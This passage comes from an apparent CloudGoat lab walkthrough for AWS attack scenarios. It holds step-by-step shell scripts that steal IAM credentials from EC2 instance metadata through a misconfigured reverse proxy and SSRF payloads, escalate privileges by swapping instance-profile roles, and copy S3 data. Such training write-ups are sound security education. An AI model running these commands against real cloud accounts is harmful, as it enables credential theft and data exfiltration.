<span class="c"># ------------- 9. To destroy the resources created during this lab:</span>
./cloudgoat.py destroy lambda_privesc


</pre></table></code></div></div><hr /><h3 id="scenarios-3-cloud_breach_s3-small--moderate">Scenarios 3: cloud_breach_s3 (Small / Moderate)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>Acquire full admin privileges.<tr><td>Size<td>Small<tr><td>Difficulty<td>Easy<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create cloud_breach_s3</code><tr><td>lesson learned<td><font color="red"> misconfigured reverse-proxy server </font> <code class="language-plaintext highlighter-rouge">curl http://$EC2IP/latest/meta-data/iam/security-credentials -H ‚ÄòHost: 169.254.169.254‚Äô</code></table></div><blockquote><p>Introduction This scenario is inspired by the Capital One breach. 2019, a bad actor accessed data stored in AWS S3 buckets owned by Capital One and posted the exfiltrated data on GitHub. The bad actor gained access to the S3 bucket by exploiting a misconfigured AWS service (in this case it seems to be a firewall) to run commands on the Elastic Cloud Compute (EC2) Instance. In addition, the EC2 Instance also had an Identity and Access Management (IAM) role assigned, which allowed anyone who had access to the server to access AWS resources such as the AWS S3 buckets.</p></blockquote><p><img data-proofer-ignore data-src="https://i.imgur.com/g2n9m9R.png" alt="scenario2-11" /></p><p>Starting as an anonymous outsider with no access or privileges</p><ul><li>exploit a misconfigured reverse-proxy server<li>to query the EC2 metadata service and acquire instance profile keys.<li>Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.</ul><hr /><h4 id="imdsv1">IMDSv1</h4><p>Reverse proxy server</p><ul><li>such a Nginx or Traefik etc<li>retrieves resources on behalf of a client/resource from one or more servers.<li>the reverse proxy server is set up in a way that anyone can set the host header to call the instance metadata API and obtain the credentials.<li>The instance metadata contains data about the EC2 instance that can use to configure or manage the running instance.<li>When an HTTP request is made to the proxy server, it contains instructions to the host.<li><p>reverse-proxy or application layer ‚Äúedge router‚Äù forward the requests to appropriate service based on the Host header in HTTP requests.</p><li>A bad actor can manipulate the host header<ul><li>to fetch other data on the proxy server such as the IAM credential.<li>exploit reverse-proxy server with overly permissive configuration<li>to reach internal applications that we can‚Äôt reach otherwise.<li>gets even more severe in cloud resources because of ‚ÄúInstance Metadata‚Äù.<ul><li>EC2 instance metadata service (IMDS)<li>Instance metadata is data about your instance that use to configure or manage the running instance.<li>Instance metadata can be accessed at the IP address 169.254.169.254, a link-local address and is valid only from the instance.</ul></ul></ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="s1">'us-east-1'</span>


<span class="c"># ------------- 1. deploy the resources for each scenario on AWS</span>
./cloudgoat.py create cloud_breach_s3
<span class="c"># starts with the IP address of an AWS EC2 instance with a misconfigured reverse proxy.</span>
<span class="c"># got the accountID and EC2 IP</span>
<span class="nv">EC2IP</span><span class="o">=</span><span class="s1">'34.228.232.48'</span>
<span class="c"># the service on port 80 of the IP address is acting as a reverse-proxy server.</span>
namp 34.228.232.48


<span class="c"># ------------- 2.  use curl to do a HTTP request to the EC2 Instance</span>
<span class="c"># exploit the reverse-proxy server to reach out to EC2 instance metadata service (IMDS).</span>
<span class="c"># using curl HTTP client to make a HTTP request to retrieve metadata</span>
<span class="c"># manipulate the host header</span>
<span class="c"># - add a "Host" header whose value points to IP address of IMDS service.</span>
<span class="c"># - to fetch other data on the proxy server such as the IAM credential associated with the instance running.</span>
<span class="c"># If the reverse-proxy server has overly permissive configuration</span>
<span class="c"># - the request will be forwarded to IMDS service</span>
<span class="c"># - and it will return some metadata related information.</span>
<span class="c"># reveals that the instance is acting as a reverse proxy server.</span>

<span class="nv">IPV4</span><span class="o">=</span><span class="sb">`</span>curl <span class="nt">-s</span> http://<span class="nv">$EC2IP</span>/latest/meta-data/local-ipv4 <span class="nt">-H</span> <span class="s1">'Host:169.254.169.254'</span><span class="sb">`</span>
<span class="c"># 10.10.10.238</span>
<span class="c"># evident that the reverse-proxy server has overly permissive configuration to access AWS EC2 IMDS.</span>

<span class="nv">IAMROLENAME</span><span class="o">=</span><span class="sb">`</span>curl http://<span class="nv">$EC2IP</span>/latest/meta-data/iam/security-credentials <span class="nt">-H</span> ‚ÄòHost: 169.254.169.254‚Äô<span class="sb">`</span>
<span class="c"># cg-backing-WAF-Role-cgidppobj072co</span>

<span class="c"># Use a curl to get more information about the IAM role.</span>
<span class="nv">IAMROLEINFO</span><span class="o">=</span><span class="sb">`</span>curl http://<span class="nv">$EC2IP</span>/latest/meta-data/iam/security-credentials/<span class="nv">$IAMROLENAME</span> <span class="nt">-H</span> ‚ÄòHost: 169.254.169.254‚Äô<span class="sb">`</span>
<span class="c"># This command returns the access key ID, secret access key and the session token of the IAM instance profile attached to the EC2 Instance. This credential is a temporary one, as it has an expiration date.</span>
<span class="nv">TEMROFILE</span><span class="o">=</span><span class="s1">'lambdaManager'</span>
<span class="nv">TEMROFILE_AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IAMROLEINFO</span> | jq <span class="nt">-r</span> .AccessKeyId<span class="sb">`</span>
<span class="nv">TEMROFILE_AWS_AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IAMROLEINFO</span> | jq <span class="nt">-r</span> .SecretAccessKey<span class="sb">`</span>
<span class="nv">TEMROFILE_AWS_SESSION_TOKEN</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IAMROLEINFO</span> | jq <span class="nt">-r</span> .Token<span class="sb">`</span>
<span class="c"># Configure the IAM credential on AWS CLI</span>
<span class="c"># aws configure ‚Äìprofile &lt;insert profile name here&gt;</span>
<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$TEMROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$TEMROFILE_AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$TEMROFILE_AWS_AWS_SECRET_ACCESS_KEY</span><span class="s2">
AWS_SESSION_TOKEN = </span><span class="nv">$TEMROFILE_AWS_SESSION_TOKEN</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$TEMROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>



<span class="c"># ------------- 3. use enumerate-iam script to quickly verify the role permissions.</span>
python enumerate-iam.py <span class="se">\</span>
    <span class="nt">--access-key</span> <span class="nv">$TEMROFILE_AWS_ACCESS_KEY_ID</span> <span class="se">\</span>
    <span class="nt">--secret-key</span> <span class="nv">$TEMROFILE_AWS_AWS_SECRET_ACCESS_KEY</span> <span class="se">\</span>
    <span class="nt">--session-token</span> <span class="nv">$TEMROFILE_AWS_SESSION_TOKEN</span>


<span class="c"># ------------- 4. List the s3 bucket</span>
<span class="c"># list the buckets</span>
aws s3 <span class="nb">ls</span> <span class="se">\</span>
    -‚Äìprofile <span class="nv">$TEMROFILE</span>
<span class="c"># copy the files from the s3 bucket to a new folder.</span>
aws s3 <span class="nb">sync </span>s3://BUCKET-NAME ./datafile <span class="se">\</span>
    -‚Äìprofile <span class="nv">$TEMROFILE</span>

<span class="nb">cd</span> ./datafile
<span class="nb">head </span>cardholder_data_primary.csv



<span class="c"># ------------- 4. destroy the resources created during this lab:</span>
./cloudgoat.py destroy cloud_breach_s3


</pre></table></code></div></div><hr /><h4 id="imdsv2">IMDSv2</h4><p>IMDSv1</p><ul><li>has been widely exploited using web application vulnerabilities in web applications running on EC2 to gain access to IAM credentials.<li>such as Server Side Request Forgery (SSRF), Command Injection etc<li>AWS released an update to <font color="red"> EC2 instance metadata service </font> for querying instance metadata values.</ul><p>IMDSv2</p><ul><li>a defence in depth<li>against open firewalls and SSRF vulnerabilities.<li>IMDSv2 needs a session token for making any request to the service.<li>This token can only be obtained by making a specific request using the HTTP PUT method.<li><a href="https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650">IMDSv2</a></ul><p>Although IMDSv2 effectively mitigates most SSRF attacks</p><ul><li>it still cannot mitigate security issues like mis-configured reverse-proxy servers such as the one we exploited.</ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="c"># -------- 1. setup</span>
<span class="c"># upgrade the vulnerable EC2 instance from IMDSv1 to IMDSv2.</span>
<span class="c"># need the latest AWS CLI ( &gt;=1.16.287) that supports IMDSv2.</span>
<span class="c"># using cloudgoat profile (Admin user) to update EC2 instance from IMDSv1 to IMDSv2.</span>

pip3 <span class="nb">install </span>awscli
pip3 upgrade awscli

aws ec2 modify-instance-metadata-options <span class="se">\</span>
    <span class="nt">--instance-id</span> &lt;INSTANCE-ID&gt; <span class="se">\</span>
    <span class="nt">--profile</span> cloudgoat <span class="se">\</span>
    <span class="nt">--http-endpoint</span> enabled <span class="se">\</span>
    <span class="nt">--http-token</span> required


<span class="c"># -------- 2. exploit IMDS v2 using the mis-configured reverse proxy.</span>
<span class="c"># generate the token for accessing metadata endpoint with the below HTTP PUT request</span>

<span class="nv">TOKEN</span><span class="o">=</span><span class="sb">`</span>curl <span class="nt">-X</span> PUT <span class="s1">'http://54.196.109.217/latest/api/token'</span> <span class="se">\</span>
        <span class="nt">--H</span> <span class="s1">'X-aws-ec2-metadata-token-ttl-seconds: 21600'</span> <span class="se">\</span>
        <span class="nt">--H</span> <span class="s1">'Host:169.254.169.254'</span> <span class="sb">`</span>

<span class="c"># use the security token obtained as part of the HTTP request header.</span>
curl <span class="nt">-s</span> http://<span class="nv">$EC2IP</span>/latest/meta-data/local-ipv4 <span class="se">\</span>
    <span class="nt">--H</span> <span class="s1">'X-aws-ec2-metadata-token:$TOKEN'</span> <span class="se">\</span>
    <span class="nt">--H</span> <span class="s1">'Host:169.254.169.254'</span>
<span class="c"># 10.10.10.238</span>



<span class="c"># -------- 3. destroy the resources created during this lab:</span>
./cloudgoat.py destroy cloud_breach_s3
</pre></table></code></div></div><hr /><h3 id="scenarios-4-iam_privesc_by_attachment-medium--moderate">Scenarios 4: iam_privesc_by_attachment (Medium / Moderate)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>deleting the <code class="language-plaintext highlighter-rouge">cg-super-critical-security-server</code><tr><td>Size<td>Medium<tr><td>Difficulty<td>Moderate<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create iam_privesc_by_attachment</code><tr><td>lesson learned<td><font color="red"> check role, create ec2, swap role, terminate other service </font></table></div><p>Starting with a very limited set of permissions</p><ul><li>leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own.<li>With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario‚Äôs goal<ul><li>deleting the <code class="language-plaintext highlighter-rouge">cg-super-critical-security-server</code><li>and paving the way for further nefarious actions.</ul></ul><p><img data-proofer-ignore data-src="https://i.imgur.com/n9sGgxH.png" alt="6874" /></p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="c"># got the IAM User "Kerrigan"</span>
<span class="c"># uses their limited privileges to explore the environment.</span>
aws configure <span class="nt">--profile</span> Kerrigan


<span class="c"># lists EC2 instances</span>
<span class="c"># identifying the "cg-super-critical-security-server"</span>
<span class="c"># unable to directly affect the target</span>
aws ec2 describe-instances <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan

aws iam list-instance-profiles <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan



<span class="c"># enumerate existing instance profiles and roles within the account</span>
<span class="c"># identifying an instance profile they can use and a promising-looking role.</span>
<span class="c"># swap the full-admin role onto the instance profile.</span>

aws iam list-roles <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan

aws iam remove-role-from-instance-profile <span class="se">\</span>
    <span class="nt">--instance-profile-name</span> cg-ec2-meek-instance-profile-&lt;cloudgoat_id&gt; <span class="se">\</span>
    <span class="nt">--role-name</span> cg-ec2-meek-role-&lt;cloudgoat_id&gt; <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan

aws iam add-role-to-instance-profile <span class="se">\</span>
    <span class="nt">--instance-profile-name</span> cg-ec2-meek-instance-profile-&lt;cloudgoat_id&gt; <span class="se">\</span>
    <span class="nt">--role-name</span> cg-ec2-mighty-role-&lt;cloudgoat_id&gt; <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan



<span class="c"># creates a new EC2 key pair.</span>
aws ec2 create-key-pair <span class="se">\</span>
    <span class="nt">--key-name</span> pwned <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan


<span class="c"># creates a new EC2 instance with that keypair</span>
aws ec2 describe-subnets <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan

aws ec2 describe-security-groups <span class="se">\</span>
    <span class="nt">--profile</span> Kerrigan

aws ec2 run-instances <span class="se">\</span>
    <span class="nt">--image-id</span> ami-0a313d6098716f372 <span class="se">\</span>
    <span class="nt">--iam-instance-profile</span> <span class="nv">Arn</span><span class="o">=</span>&lt;instanceProfileArn&gt; <span class="se">\</span>
    <span class="nt">--key-name</span> pwned <span class="se">\</span>
    <span class="nt">--profile</span> kerrigan <span class="se">\</span>
    <span class="nt">--subnet-id</span> &lt;subnetId&gt; <span class="se">\</span>
    <span class="nt">--security-group-ids</span> &lt;securityGroupId&gt;


<span class="c"># now have shell access to it.</span>
<span class="nb">sudo </span>apt-get update
<span class="nb">sudo </span>apt-get <span class="nb">install </span>awscli

aws ec2 describe-instances <span class="se">\</span>
    <span class="nt">--region</span> us-east-1



<span class="c"># attaches the full-admin-empowered instance profile to the EC2 instance.</span>


<span class="c"># By accessing and using the new EC2 instance as a staging platform</span>
<span class="c"># execute AWS CLI commands with full admin privileges granted by the attached profile's role.</span>


<span class="c"># terminate the "cg-super-critical-security-server" EC2 instance, completing the scenario.</span>

aws ec2 terminate-instances <span class="se">\</span>
    <span class="nt">--instance-ids</span> &lt;instanceId&gt; <span class="se">\</span>
    <span class="nt">--region</span> us-east-1

</pre></table></code></div></div><hr /><h3 id="scenarios-5-ec2_ssrf-medium--moderate">Scenarios 5: ec2_ssrf (Medium / Moderate)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>Invoke the <code class="language-plaintext highlighter-rouge">cg-lambda-[ CloudGoat ID ]</code> Lambda function<tr><td>Size<td>Medium<tr><td>Difficulty<td>Moderate<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create ec2_ssrf</code><tr><td>lesson learned<td><font color="red"> found credentials in the environment variables for a Lambda Function &gt; discovered an EC2 instance hosting a website &gt; exploiting the web application, gain credentials by querying the internal metadata API. </font></table></div><p>Starting as the IAM user Solus</p><ul><li>have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF).<li>After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/F3N3Bqh.png" alt="6874" /></p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
</pre><td class="rouge-code"><pre><span class="c"># Pacu a cloud pentest framework and run the install script.</span>
git clone https://github.com/RhinoSecurityLabs/pacu
sh pacu/install.sh


<span class="c"># launch the scenario.</span>
<span class="c"># ./ec2_ssrf_&lt;id &gt;/start.txt contains the initials credentials for the user solus.</span>
<span class="c"># add these keys into Pacu to begin enumerating.</span>
aws configure <span class="nt">--profile</span> cloudgoat
python3 cloudgoat.py create ec2_ssrf <span class="nt">--profile</span> cloudgoat.



<span class="c"># ----------- 1. Enumerating IAM and Lambda</span>
<span class="c"># As the IAM user Solus</span>
<span class="c"># explores the AWS environment and discovers they can list Lambda functions in the account.</span>
<span class="c"># Looking through the function‚Äôs configuration, access keys stored in the function‚Äôs environment variables.</span>
<span class="c"># Environment variables are a common area to find secrets in many services in AWS including Lambdas.</span>
aws lambda list-function <span class="se">\</span>
    <span class="nt">--profile</span> solus


<span class="c"># Within a Lambda function, the attacker finds AWS access keys belonging to a different user.</span>
aws configure <span class="nt">--profile</span> cglambda


<span class="c"># discovers an EC2 instance</span>
aws ec2 describe-instances <span class="nt">--profile</span> cglambda

Go to http://&lt;EC2 instance IP&gt;



<span class="c"># ----------- 2. Exploiting SSRF for AWS Metadata Access</span>
<span class="c"># running a web application vulnerable to a SSRF vulnerability.</span>
<span class="c"># Exploiting the SSRF vulnerability via the ?url=... parameter</span>
<span class="c"># to hit the EC2 instance metadata</span>
<span class="c"># to steal AWS keys from the EC2 metadata service.</span>
<span class="c"># Every EC2 instance has access to internal aws metadata by calling a specific endpoint from within the instance.</span>
<span class="c"># - The metadata contains information and credentials used by the instance.</span>
<span class="c"># - use those credentials to possibly escalate our privileges</span>
http://&lt;EC2 instance IP&gt;/?url<span class="o">=</span>http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://&lt;EC2 instance IP&gt;/?url<span class="o">=</span>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;the role name&gt;

<span class="c"># Add the EC2 instance credentials</span>
<span class="o">[</span>ec2role]
aws_access_key_id <span class="o">=</span> asdasdasd
aws_secret_access_key <span class="o">=</span> asdasdsadas
aws_session_token <span class="o">=</span> <span class="s2">"asdasdasd"</span>




<span class="c"># ----------- 3. Pivoting into S3 Buckets</span>
<span class="c"># finds a private S3 bucket containing another set of AWS credentials for a more powerful user: Shepard.</span>
aws s3 <span class="nb">ls</span> <span class="nt">--profile</span> cgec2role

aws s3 <span class="nb">ls</span> <span class="nt">--profile</span> cgec2role s3://cg-secret-s3-bucket-&lt;cloudgoat_id&gt;

aws s3 <span class="nb">cp</span> <span class="nt">--profile</span> cgec2role s3://cg-secret-s3-bucket-&lt;cloudgoat_id&gt;/admin-user.txt ./

<span class="nb">cat </span>admin-user.txt



<span class="c"># ----------- 4. Compromising Scenario Flag</span>
<span class="c"># Now operating as Shepard,</span>
aws configure <span class="nt">--profile</span> cgadmin
<span class="c"># with full-admin final privileges, invoke the original Lambda function to complete the scenario.</span>
aws lambda list-functions <span class="nt">--profile</span> cgadmin

aws lambda invoke <span class="nt">--function-name</span> cg-lambda-&lt;cloudgoat_id&gt; ./out.txt

<span class="nb">cat </span>out.txt



</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/26kG2BG.png" alt="web-edit-2-750x375" /></p><hr /><h3 id="scenarios-6-rce_web_app-medium--hard">Scenarios 6: rce_web_app (Medium / Hard)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>get the SSH keys which grant direct access to the EC2<tr><td>Size<td>Medium<tr><td>Difficulty<td>Hard<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create rce_web_app</code></table></div><p>lesson learned:</p><ol><li>Access to the <font color="red"> elastic load balancer log files </font><ul><li>which led to the secret URL. (should be restricted to a need-to-know basis)</ul><li>Remote code execution vulnerability on the web application<ul><li>which allowed to run commands on the EC2 Instance as root granting us access to sensitive information.</ul><li>Access to the <font color="red"> user data in the EC2 instance </font><ul><li>which granted us access to the RDS Instance.</ul><li>weak credential manage<ul><li>SSH keys were stored in an S3 bucket and used to gain access to the EC2 instance.<li>Credentials (user name and password) to the RDS instance were stored in a text file.</ul></ol><p>Starting as the IAM user Lara</p><ul><li>explores a Load Balancer and S3 bucket for clues to vulnerabilities,<li>leading to an RCE exploit on a vulnerable web app<li>exposes confidential files and culminates in access to the scenario‚Äôs goal: a highly-secured RDS database instance.</ul><p>Alternatively</p><ul><li>may start as the IAM user McDuck and enumerate S3 buckets,<li>eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/x8NbBiD.png" alt="687467" /></p><h4 id="laras-path">Lara‚Äôs path</h4><ol><li>recon</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="c">#set command line parameters</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials


<span class="c"># ------------- 1. Deploying the resources gives us the access key and secret key</span>
<span class="nv">SRC_PROFILE</span><span class="o">=</span><span class="s1">'Lara'</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s1">'xxx'</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s1">'yyy'</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="s1">'us-east-1'</span>
<span class="c"># aws sts get-caller-identity --profile $SRC_PROFILE</span>
<span class="nv">USE_RNAME</span><span class="o">=</span><span class="s1">'lara'</span>


<span class="c"># ------------- 2. create a profile</span>
<span class="c"># aws configure --profile $SRC_PROFILE</span>
<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$SRC_PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$SRC_PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>



<span class="c"># ------------- 3. enumerating the policies and permissions</span>
<span class="c"># see what privileges the user has</span>
<span class="c"># python enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY</span>
aws iam list-user-policies <span class="se">\</span>
    <span class="nt">--user-name</span> <span class="nv">$USE_RNAME</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

aws iam list-attached-user-policies
    <span class="nt">--user-name</span> <span class="nv">$USE_RNAME</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

aws iam list-roles
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>


<span class="c"># lists S3 buckets</span>
<span class="c"># discovering one which contains the logs for the Load Balancer.</span>
aws s3 <span class="nb">ls</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

aws s3 <span class="nb">ls </span>s3://&lt;bucket&gt; <span class="se">\</span>
    <span class="nt">--recursive</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

aws s3 <span class="nb">cp </span>s3://&lt;bucket&gt;/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log <span class="nb">.</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>
</pre></table></code></div></div><ol><li>investigate the elb log</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c"># ------------- 4. reviewing the contents of the logs</span>
<span class="c"># discovers a web application hosted behind a elb, secured Load Balancer.</span>
<span class="c"># the log file reveals it is an HTTP log file</span>
<span class="c"># the web app has a secret admin page.</span>
<span class="nb">cat </span>555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log

<span class="c"># ------------- two ways to analyze this log file.</span>
<span class="c"># 1. Using grep to find and extract URLs from the log file.</span>
<span class="nb">cat</span> &lt;insert file name here&gt; | <span class="nb">grep</span> <span class="nt">-Eo</span> ‚Äò<span class="o">(</span>http|https<span class="o">)</span>://[a-zA-Z0-9./?<span class="o">=</span>_%:-]<span class="k">*</span>‚Äô
<span class="c"># http://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx</span>

<span class="c"># 2. Using an ELB log analyzer: log analyzer for AWS Elastic Load Balancer by Ozantunca on GitHub</span>
elb-log-analyzer &lt;insert log name here&gt;
<span class="c"># 1 - 9 - http://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx</span>
<span class="c"># try accessing the webpage, as it has been accessed multiple times via different ELBs. It is unavailable.</span>


<span class="c"># identify whether there‚Äôs a load balancer or EC2 instance deployed and if we have access to it.</span>
aws ec2 describe-load-balancers <span class="se">\</span>
    ‚Äì-region <span class="nv">$AWS_REGION</span> <span class="se">\</span>
    -‚Äìprofile <span class="nv">$SRC_PROFILE</span>
<span class="c"># not sure what kind of elastic load balancer is deployed</span>
<span class="c"># assume it‚Äôs an application load balancer, since a web server deployed on the EC2 instance (port 80 is enabled on the server).</span>
<span class="nv">ELBINFO</span><span class="o">=</span><span class="sb">`</span>aws elbv2 describe-load-balancers <span class="se">\</span>
            ‚Äì-region <span class="nv">$AWS_REGION</span> <span class="se">\</span>
            -‚Äìprofile <span class="nv">$SRC_PROFILE</span><span class="sb">`</span>
<span class="nv">DNSNAME</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$ELBINFO</span> | jq <span class="nt">-r</span> .LoadBalancers[].DNSName<span class="sb">`</span>
<span class="c"># cg-lb-cgidp347lhz47g-accounid.us-east-1.elb.amazon.com</span>
</pre></table></code></div></div><ol><li>visit the secret admin URL</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c"># visit the public IP address of the elastic load balancer. It references a secret URL.</span>
curl <span class="nv">$DNSNAME</span>

<span class="c"># visit the secret admin URL (the .html webpage identified in the ELB log file)</span>
cg-lb-cgidp347lhz47g-accounid.us-east-1.elb.amazon.com:80:xxxxx

<span class="c"># try different commands.</span>
<span class="c"># the web app is vulnerable to a remote code execution (RCE) attack via a secret parameter embedded in a form.</span>
<span class="c"># and the commands are running as root.</span>


<span class="c"># query the instance metadata API to obtain the credentials to reveal the role name of the EC2 instance.</span>
<span class="c"># The instance metadata contains data about the EC2 instance that you can use to configure or manage the running instance.</span>
curl http://169.254.269.254/latest/meta-data/iam/security-credentials
curl http://169.254.269.254/latest/meta-data/iam/security-credentials/role-name
<span class="c"># querying the user data to see if there were any user data specified during the creation of the EC2 instance.</span>
<span class="c"># all the command history, discovers the RDS database credentials and address.</span>
curl http://169.254.169.254/latest/user-data

<span class="c"># The user data contains commands and credentials to the RDS instance (with table ‚Äúsensitive information‚Äù).</span>
<span class="c"># access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database</span>
psql postgresql://&lt;db_user&gt;:&lt;db_password&gt;@&lt;rds-instance&gt;:5432/&lt;db_name&gt;
